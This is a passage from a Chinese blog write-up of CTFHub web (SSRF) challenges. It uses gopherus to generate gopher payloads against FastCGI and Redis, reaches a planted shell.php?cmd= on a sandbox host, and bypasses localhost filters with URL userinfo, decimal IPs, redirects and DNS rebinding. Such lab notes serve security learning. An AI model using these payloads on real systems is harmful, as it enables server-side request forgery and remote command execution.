40.32-26.901333 62.72-8.96 13.418667-13.418667 26.88-22.378667 40.32 0 17.92-4.501333 31.36 4.458667 44.8 22.421333 31.36 62.72 13.44 94.08 26.901333 8.96 4.458667 17.92 4.458667 22.421333 13.418667 13.418667 13.461333 13.418667 35.861333 17.92 49.301333 4.458667 17.92 8.96 35.84 17.92 53.76 4.48 22.421333 13.44 44.821333 17.92 62.72 40.341333-31.36 76.16-67.178667 103.04-112 26.88-31.424 40.341333-67.242667 53.76-103.104" fill="#CDDC39"></path></svg></span></a>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ py gopherus.py --exploit fastcgi
</span></span></code></pre></div><p>按要求输入一个存在的php文件和一个系统命令，即可生成编码一次的gopher://开头的url。</p>
<p>放入burp再编码一次key character，即可完全复制到<code>/?url=</code>后面。</p>
<p>grep慎用，因为服务端不一定是threadripper</p>
<h3 id="redis协议">Redis协议</h3>
<p>同样使用gopherus，然后直接访问生成的shell.php即可</p>
<pre tabindex="0"><code>challenge-be9110e1ea94749a.sandbox.ctfhub.com:10800/shell.php?cmd=[系统命令]
</code></pre><h3 id="url-bypass">URL Bypass</h3>
<p>题目要求用一个奇怪的域名作为URL的开头。但是，注意到http协议的url格式：</p>
<pre tabindex="0"><code>┌────────────────────────────────────────────────────────────────────────────────────────────────┐
│                                              href                                              │
├──────────┬──┬─────────────────────┬────────────────────────┬───────────────────────────┬───────┤
│ protocol │  │        auth         │          host          │           path            │ hash  │
│          │  │                     ├─────────────────┬──────┼──────────┬────────────────┤       │
│          │  │                     │    hostname     │ port │ pathname │     search     │       │
│          │  │                     │                 │      │          ├─┬──────────────┤       │
│          │  │                     │                 │      │          │ │    query     │       │
&#34;  https:   //    user   :   pass   @ sub.example.com : 8080   /p/a/t/h  ?  query=string   #hash &#34;
│          │  │          │          │    hostname     │ port │          │                │       │
│          │  │          │          ├─────────────────┴──────┤          │                │       │
│ protocol │  │ username │ password │          host          │          │                │       │
├──────────┴──┼──────────┴──────────┼────────────────────────┤          │                │       │
│   origin    │                     │         origin         │ pathname │     search     │ hash  │
├─────────────┴─────────────────────┴────────────────────────┴──────────┴────────────────┴───────┤
│                                              href                                              │
└────────────────────────────────────────────────────────────────────────────────────────────────┘
(All spaces in the &#34;&#34; line should be ignored. They are purely for formatting.)
</code></pre><p>把那个奇怪的域名作为username即可，然后用127.0.0.1本地访问flag.php</p>
<h3 id="数字ip-bypass">数字IP Bypass</h3>
<p>不能用127和点，可以直接把ipv4换成一个数字，<code>127*256*256*256+1=2130706433</code>，就用2130706433代替127.0.0.1即可</p>
<p>同时，也可以直接用localhost代替127.0.0.1</p>
<h3 id="302跳转-bypass">302跳转 Bypass</h3>
<p>首先，并没有禁用localhost和数字ip，所以上一题的方法仍然适用</p>
<p>然后也可以找一个可以跳转到127.0.0.1/flag.php的短链接，但是没找到好的生成网站所以就算了（其实用自己的域名和服务器可以做）</p>
<h3 id="dns重绑定-bypass">DNS重绑定 Bypass</h3>
<a href="https://lock.cmpxchg8b.com/rebinder.html" title="rebinder"target="_blank" rel="external nofollow noopener noreferrer" class="card-link"><span class="cl-backdrop" style="--cl-bg-url: url(/fixit.min.svg);"></span>
    <span class="cl-content">
      <span class="cl-text">
        <span class="cl-title">生成器</span>
        <span class="cl-meta">
          <svg class="cl-icon-link" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" width="16" height="16"><path d="M574 665.4c-3.1-3.1-8.2-3.1-11.3 0L446.5 781.6c-53.8 53.8-144.6 59.5-204 0-59.5-59.5-53.8-150.2 0-204l116.2-116.2c3.1-3.1 3.1-8.2 0-11.3l-39.8-39.8c-3.1-3.1-8.2-3.1-11.3 0L191.4 526.5c-84.6 84.6-84.6 221.5 0 306s221.5 84.6 306 0l116.2-116.2c3.1-3.1 3.1-8.2 0-11.3L574 665.4zM832.6 191.4c-84.6-84.6-221.5-84.6-306 0L410.3 307.6c-3.1 3.1-3.1 8.2 0 11.3l39.7 39.7c3.1 3.1 8.2 3.1 11.3 0l116.2-116.2c53.8-53.8 144.6-59.5 204 0 59.5 59.5 53.8 150.2 0 204L665.3 562.6c-3.1 3.1-3.1 8.2 0 11.3l39.8 39.8c3.1 3.1 8.2 3.1 11.3 0l116.2-116.2c84.5-84.6 84.5-221.5 0-306.1z" fill="#a9a9b3"></path><path d="M610.1 372.3c-3.1-3.1-8.2-3.1-11.3 0L372.3 598.7c-3.1 3.1-3.1 8.2 0 11.3l39.6 39.6c3.1 3.1 8.2 3.1 11.3 0l226.4-226.4c3.1-3.1 3.1-8.2 0-11.3l-39.5-39.6z" fill="#a9a9b3"></path></svg>
          <span class="cl-url">https://lock.cmpxchg8b.com/rebinder.html</span>
        </span>
      </span><svg class="cl-icon-globe" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" width="64" height="64"><path d="M960 512c0 249.408-203.2 448-448 448-244.778667 0-448-198.592-448-448S262.592 64 512 64s448 198.592 448 448" fill="#2196F3"></path><path d="M507.52 718.08c0-8.96-4.48-13.44-13.44-17.92-26.88-8.96-53.76-8.96-76.16-31.381333-4.48-8.96-4.48-17.92-8.96-26.88-8.96-8.96-31.36-13.44-44.8-17.92h-89.6c-13.44-4.48-22.4-22.4-31.36-35.84 0-4.48 0-13.461333-8.96-13.461334-8.96-4.458667-17.92 4.501333-26.88 0-4.48-4.458667-4.48-8.96-4.48-13.418666 0-13.461333 8.96-26.901333 17.92-35.861334 13.44-8.96 26.88 4.48 40.32 4.48 4.48 0 4.48 0 8.96 4.48 13.44 4.48 17.92 22.4 17.92 35.861334v8.96c0 4.48 4.48 4.48 8.96 4.48 4.48-22.4 4.48-44.821333 8.96-67.2 0-26.88 26.88-53.781333 49.28-62.72 8.96-4.458667 13.44 4.501333 22.4 0 26.88-8.96 94.08-35.84 80.64-71.658667-8.96-31.381333-35.84-62.698667-71.68-58.24-8.96 4.501333-13.44 8.96-22.4 13.461333-13.44 8.96-40.32 35.84-53.76 35.84-22.4-4.48-22.4-35.84-17.92-49.301333 4.48-17.92 44.8-76.138667 71.68-67.178667l17.92 17.92c8.96 4.48 22.4 4.48 35.84 4.48 4.48 0 8.96 0 13.44-4.48 4.48-4.48 4.48-4.48 4.48-8.96 0-13.44-13.44-26.901333-22.4-35.861333s-22.4-17.92-35.84-22.378667c-44.8-13.461333-116.48 4.458667-152.32 35.84-35.84 31.36-62.72 85.12-80.64 129.92-8.96 26.88-17.92 62.698667-22.4 94.08-4.48 22.4-8.96 40.32 4.48 62.698667 13.44 26.88 40.32 53.781333 67.2 71.68 17.92 13.44 53.76 13.44 71.68 35.84 13.44 17.941333 8.96 40.32 8.96 62.72 0 26.88 17.92 49.28 26.88 71.658667 4.48 13.461333 8.96 31.381333 13.44 44.821333 0 4.48 4.48 31.36 4.48 35.84 26.88 13.44 49.28 26.901333 80.64 35.861333 4.48 0 22.4-26.901333 22.4-31.381333 13.44-13.44 22.4-31.36 35.84-40.32 8.96-4.48 17.92-8.96 26.88-17.941333 8.96-8.96 13.44-26.88 17.92-40.32 4.48-8.938667 8.96-26.858667 4.48-40.298667M516.48 305.92c4.48 0 8.96-4.48 17.92-8.96 13.44-8.96 26.901333-22.4 40.32-31.36 13.461333-8.96 26.901333-22.4 35.861333-31.36 13.44-8.96 22.4-26.88 26.88-40.341333 4.48-8.96 17.941333-26.88 13.44-40.32-4.48-8.96-26.88-13.44-35.84-17.92C579.2 126.698667 547.84 122.24 512 122.24c-13.44 0-31.36 4.458667-35.84 17.92-4.48 22.4 13.44 17.92 31.36 22.4 0 0 4.48 35.84 4.48 40.32 4.48 22.421333-8.96 35.84-8.96 58.24 0 13.44 0 35.84 8.96 44.8h4.48zM892.8 619.52c4.501333-8.96 4.501333-22.4 8.96-31.36 4.501333-22.421333 4.501333-44.8 4.501333-67.2 0-44.8-4.501333-89.578667-17.92-129.92-8.96-13.44-13.461333-26.88-17.941333-40.341333-8.96-22.378667-22.4-44.8-40.32-62.698667-17.92-22.4-40.341333-85.12-80.64-67.2-13.44 4.501333-22.4 22.421333-31.36 31.381333l-26.88 40.32c-4.501333 4.48-8.96 13.44-4.501333 17.92 0 4.48 4.501333 4.48 8.96 4.48 8.96 4.501333 13.461333 4.501333 22.421333 8.96 4.48 0 8.96 4.501333 4.48 8.96 0 0 0 4.501333-4.48 4.501334-22.421333 22.4-44.8 40.32-67.2 62.698666-4.48 4.48-8.96 13.44-8.96 17.92s4.48 4.48 4.48 8.96c0 4.501333-4.48 4.501333-8.96 8.96-8.96 4.501333-17.92 8.96-22.4 13.461334-4.48 8.96 0 22.4-4.48 31.36-4.48 22.4-17.941333 40.32-26.901333 62.72-8.96 13.418667-13.418667 26.88-22.378667 40.32 0 17.92-4.501333 31.36 4.458667 44.8 22.421333 31.36 62.72 13.44 94.08 26.901333 8.96 4.458667 17.92 4.458667 22.421333 13.418667 13.418667 13.461333 13.418667 35.861333 17.92 49.301333 4.458667 17.92 8.96 35.84 17.92 53.76 4.48 22.421333 13.44 44.821333 17.92 62.72 40.341333-31.36 76.16-67.178667 103.04-112 26.88-31.424 40.341333-67.242667 53.76-103.104" fill="#CDDC39"></path></svg></span></a>
<p>使用这个生成器，可以将一个域名解析到两个不同的IP地址，并且切换的TTL很小，有时可以骗过一些检测。本题不能用带127的东西访问，却又要求从127.0.0.1进入。</p>
<p>随便选一个网址对应的ipv4，例如ctfhub.com[180.163.28.105]</p>
<p>得到一个网址<code>7f000001.b4a31c69.rbndr.us</code></p>
<p>于是用以上网址替代127.0.0.1，多刷几次就得到flag了。</p>
</div><div class="post-footer" id="post-footer">
  <div class="post-info">
    <div class="post-info-line">
      <div class="post-info-mod">
        <span title=2023-01-14&#32;11:29:58>更新于 2023-01-14&nbsp;</span>
      </div><div class="post-info-license">
          <span><a rel="license external nofollow noopener noreferrer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span>
        </div></div>
    <div class="post-info-line">
      <div class="post-info-md"></div>
      <div class="post-info-share">
        <span><a href="javascript:void(0);" title="分享到 Twitter" data-sharer="twitter" data-url="https://andreoy.cn/posts/ctfhub%E7%AC%94%E8%AE%B0-web/" data-title="CTFHub笔记-Web章节" data-hashtags="CTFHUB,信息安全,Web,笔记"><i class="fa-brands fa-twitter fa-fw" aria-hidden="true"></i></a>
  <a href="javascript:void(0);" title="分享到 Facebook" data-sharer="facebook" data-url="https://andreoy.cn/posts/ctfhub%E7%AC%94%E8%AE%B0-web/" data-hashtag="CTFHUB"><i class="fa-brands fa-facebook-square fa-fw" aria-hidden="true"></i></a>
  <a href="javascript:void(0);" title="分享到 Linkedin" data-sharer="linkedin" data-url="https://andreoy.cn/posts/ctfhub%E7%AC%94%E8%AE%B0-web/"><i class="fa-brands fa-linkedin fa-fw" aria-hidden="true"></i></a>
  <a href="javascript:void(0);" title="分享到 Tumblr" data-sharer="tumblr" data-url="https://andreoy.cn/posts/ctfhub%E7%AC%94%E8%AE%B0-web/" data-title="CTFHub笔记-Web章节" data-tags="CTFHUB,信息安全,Web,笔记"><i class="fa-brands fa-tumblr fa-fw" aria-hidden="true"></i></a>
  <a href="javascript:void(0);" title="分享到 Reddit" data-sharer="reddit" data-url="https://andreoy.cn/posts/ctfhub%E7%AC%94%E8%AE%B0-web/"><i class="fa-brands fa-reddit fa-fw" aria-hidden="true"></i></a>
  <a href="javascript:void(0);" title="分享到 微博" data-sharer="weibo" data-url="https://andreoy.cn/posts/ctfhub%E7%AC%94%E8%AE%B0-web/" data-title="CTFHub笔记-Web章节" data-image="https://pigco-1313228125.cos.ap-shanghai.myqcloud.com/img/image-20230115185002636.png"><i class="fa-brands fa-weibo fa-fw" aria-hidden="true"></i></a>
  <a href="javascript:void(0);" title="分享到 Blogger" data-sharer="blogger" data-url="https://andreoy.cn/posts/ctfhub%E7%AC%94%E8%AE%B0-web/" data-title="CTFHub笔记-Web章节" data-description=""><i class="fa-brands fa-blogger fa-fw" aria-hidden="true"></i></a>
  <a href="javascript:void(0);" title="分享到 Evernote" data-sharer="evernote" data-url="https://andreoy.cn/posts/ctfhub%E7%AC%94%E8%AE%B0-web/" data-title="CTFHub笔记-Web章节"><i class="fa-brands fa-evernote fa-fw" aria-hidden="true"></i></a>
  <a href="javascript:void(0);" title="分享到 Skype" data-sharer="skype" data-url="https://andreoy.cn/posts/ctfhub%E7%AC%94%E8%AE%B0-web/" data-title="CTFHub笔记-Web章节"><i class="fa-brands fa-skype fa-fw" aria-hidden="true"></i></a>
  <a href="javascript:void(0);" title="分享到 Trello" data-sharer="trello" data-url="https://andreoy.cn/posts/ctfhub%E7%AC%94%E8%AE%B0-web/" data-title="CTFHub笔记-Web章节" data-description=""><i class="fa-brands fa-trello fa-fw" aria-hidden="true"></i></a>
  </span>
      </div>
    </div>
  </div>

  <div class="post-info-more">
    <section class="post-tags"><i class="fa-solid fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/ctfhub/">CTFHUB</a>,&nbsp;<a href="/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/">信息安全</a>,&nbsp;<a href="/tags/web/">Web</a>,&nbsp;<a href="/tags/%E7%AC%94%E8%AE%B0/">笔记</a></section>
    <section>
      <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
    </section>
  </div>

  <div class="post-nav"><a href="/posts/%E7%B2%89%E8%89%B2%E7%9A%84%E8%A5%BF%E6%9F%9A%E6%85%95%E6%96%AF%E8%9B%8B%E7%B3%95/" class="prev" rel="prev" title="粉色的西柚慕斯蛋糕"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>粉色的西柚慕斯蛋糕</a>
      <a href="/posts/%E8%BF%94%E6%A0%A1%E5%AE%A3%E8%AE%B2%E5%A4%A7%E7%BA%B2/" class="next" rel="next" title="返校宣讲大纲">返校宣讲大纲<i class="fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
</div>
<div id="comments"><div id="giscus">
          <script
            src="https://giscus.app/client.js"
            data-repo="hzyangjc/hzyangjc.github.io"
            data-repo-id="R_kgDOIAWwEQ"
            data-category="Announcements"
            data-category-id="DIC_kwDOIAWwEc4CRdaC"
            data-mapping="pathname"
            
            data-theme="preferred_color_scheme"
            data-reactions-enabled="1"
            data-emit-metadata="0"
            data-input-position="top"
            data-lang="zh-CN"
            data-loading="lazy"
            crossorigin="anonymous"
            async
            defer
          ></script>
          <noscript>
            Please enable JavaScript to view the comments powered by <a href="https://giscus.app/" rel="external nofollow noopener noreferrer">giscus</a>.
          </noscript>
        </div></div></article></main><footer class="footer">
    <div class="footer-container"><div class="footer-line powered">由 <a href="https://gohugo.io/" target="_blank" rel="external nofollow noopener noreferrer" title="Hugo 0.118.2">Hugo</a> 强力驱动 | 主题 - <a href="https://github.com/hugo-fixit/FixIt" target="_blank" rel="external" title="FixIt v0.2.16-RC"><img class="fixit-icon" src="/fixit.min.svg" alt="FixIt logo" />&nbsp;FixIt</a>
        </div><div class="footer-line copyright" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright fa-fw" aria-hidden="true"></i>
            <span itemprop="copyrightYear">2022 - 2024</span><span class="author" itemprop="copyrightHolder">
              <a href="/"></a></span><span class="license footer-divider"><a rel="license external nofollow noopener noreferrer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div><div class="footer-line statistics"><span class="site-time" title='网站运行中 ...'><i class="fa-solid fa-heartbeat fa-fw animate-icon" aria-hidden="true"></i>&nbsp;<span class="run-times">网站运行中 ...</span></span></div><div class="footer-line ibruce">
          <span id="busuanzi_container_site_uv" title='总访客数'><i class="fa-regular fa-user fa-fw" aria-hidden="true"></i>&nbsp;<span id="busuanzi_value_site_uv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span><span id="busuanzi_container_site_pv" class="footer-divider" title='总访问量'><i class="fa-regular fa-eye fa-fw" aria-hidden="true"></i>&nbsp;<span id="busuanzi_value_site_pv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span>
        </div></div>
  </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="回到顶部"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric d-none">0%</span>
        </div><div class="fixed-button view-comments d-none" role="button" aria-label="查看评论"><i class="fa-solid fa-comment fa-fw" aria-hidden="true"></i></div></div><div id="mask"></div><noscript>
    <div class="noscript-warning">FixIt 主题在启用 JavaScript 的情况下效果最佳。</div>
  </noscript>
</div><link rel="stylesheet" href="/lib/lightgallery/css/lightgallery-bundle.min.css"><link rel="stylesheet" href="/lib/katex/katex.min.css"><link rel="stylesheet" href="/lib/katex/copy-tex.min.css"><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script src="/lib/autocomplete/autocomplete.min.js" defer></script><script src="/lib/lunr/lunr.min.js" defer></script><script src="/lib/lunr/lunr.stemmer.support.min.js" defer></script><script src="/lib/lunr/lunr.zh.min.js" defer></script><script src="/lib/lazysizes/lazysizes.min.js" async defer></script><script src="/lib/twemoji/twemoji.min.js" defer></script><script src="/lib/lightgallery/lightgallery.min.js" defer></script><script src="/lib/lightgallery/plugins/thumbnail/lg-thumbnail.min.js" defer></script><script src="/lib/lightgallery/plugins/zoom/lg-zoom.min.js" defer></script><script src="/lib/sharer/sharer.min.js" async defer></script><script src="/lib/katex/katex.min.js" defer></script><script src="/lib/katex/auto-render.min.js" defer></script><script src="/lib/katex/copy-tex.min.js" defer></script><script src="/lib/katex/mhchem.min.js" defer></script><script src="/lib/cookieconsent/cookieconsent.min.js" defer></script><script src="/lib/pangu/pangu.min.js" defer></script><script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async defer></script><script>window.config={"code":{"copyTitle":"复制到剪贴板","editLockTitle":"锁定可编辑代码块","editUnLockTitle":"解锁可编辑代码块","editable":true,"maxShownLines":50},"comment":{"enable":true,"giscus":{"darkTheme":"transparent_dark","lightTheme":"light"}},"cookieconsent":{"content":{"dismiss":"同意","link":"了解更多","message":"本网站使用 Cookies 来改善您的浏览体验。"},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"enablePWA":true,"enablePangu":true,"lightgallery":true,"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","lunrLanguageCode":"zh","lunrSegmentitURL":"/lib/lunr/lunr.segmentit.js","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":30,"type":"lunr"},"siteTime":"2022-09-16T09:30:34+08:00","twemoji":true};</script><script src="/js/theme.min.js" defer></script><script>
      window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments);}gtag('js', new Date());
      gtag('config', 'G-SWE55VZ73Q');
    </script><script src="https://www.googletagmanager.com/gtag/js?id=G-SWE55VZ73Q" async></script></body>
</html>
